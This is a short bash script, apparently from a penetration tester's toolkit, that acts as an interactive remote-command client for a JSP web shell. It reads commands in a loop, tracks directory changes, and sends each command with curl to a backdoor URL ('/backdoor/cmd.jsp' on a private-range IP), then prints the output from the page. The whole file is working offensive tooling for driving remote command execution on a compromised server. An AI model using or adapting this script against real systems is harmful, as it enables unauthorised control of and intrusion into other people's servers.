#!/usr/bin/env -S bash

:<<!
auth: @cyhfvg https://github.com/cyhfvg
date: 2022/10/29

Bash-invoker example script for RCE(Remote command execute) exploit.
!

set -euo pipefail
cd ${0%/*}

prompt_opt=">"
cur_path=""
cd_cmd=""

echo -e "input command.\nExample:\n>whoami\n"
echo -n "${prompt_opt}"

while read cmd
do
    printf "\033[32m${cmd}\033[0m\n";

    if echo "${cmd}" | grep -qP 'cd \S+'; then
        tmp_path="$(echo "${cmd}" | grep -oP '(?<=cd\s).+')"
        if [ "${tmp_path:0:1}" = "/" ]; then
            cur_path="${tmp_path}"
        elif [ "${tmp_path:0:2}" = ".." ]; then
            cur_path="${cur_path%/*}"
        else
            cur_path="${cur_path}/${tmp_path}"
        fi

        cur_path="$(echo ${cur_path} | sed -e 's#/\+#/#g;s#/$##g')"

        cd_cmd="cd ${cur_path}/ &&"
        echo -n "${cur_path}${prompt_opt}"
        continue
    fi

    # FIXME: change to correct command
    # urlencode get param
    content=$(curl -s --data-urlencode cmd="${cd_cmd} ${cmd}" "http://10.11.1.209:8080/backdoor/cmd.jsp" | sed -ne '/<pre>/,/<\/pre>/p' | sed -e '1d;$d')

    printf "\033[33m%s\033[0m\n" "${content}"

    echo -n "${cur_path}${prompt_opt}"
done
